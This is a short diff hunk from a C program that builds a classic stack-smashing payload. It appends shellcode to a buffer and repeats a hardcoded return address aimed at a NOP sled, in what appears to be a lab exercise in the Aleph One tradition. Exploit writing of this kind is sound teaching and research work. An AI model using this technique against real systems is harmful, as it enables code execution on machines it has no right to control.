@@ -22,10 +22,10 @@ int main(void)
   }
 
   // `cat sc`
-  strcat(str, shellcodeAlephOne);
+  strcat(str, shellcode);
   // `perl -e 'print"\xf8\xf2\xff\xbf"x38' the return address
   
-  for (int i = 0; i < 38; ++i)
+  for (int i = 0; i < 38; i++)
   {
     // Anything from 0xbffffb30 to 0xbffffbf0 should work
     // the return address should point to the \x90
